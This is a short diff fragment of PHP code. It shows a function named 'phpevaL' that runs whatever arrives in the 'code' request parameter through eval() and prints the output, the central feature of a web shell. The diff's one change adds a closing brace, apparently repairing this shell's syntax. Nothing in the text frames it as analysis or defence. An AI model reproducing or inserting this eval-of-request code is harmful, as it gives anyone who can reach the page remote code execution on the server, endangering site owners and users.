@@ -13,6 +13,7 @@ function phpevaL(){
 	echo "<textarea rows='10' cols='64'>";
 	echo htmlspecialchars(eval(replace_stR($s,$_REQUEST['code'])));
 	echo '</textarea><br><br>';
+	}
 }
 
 
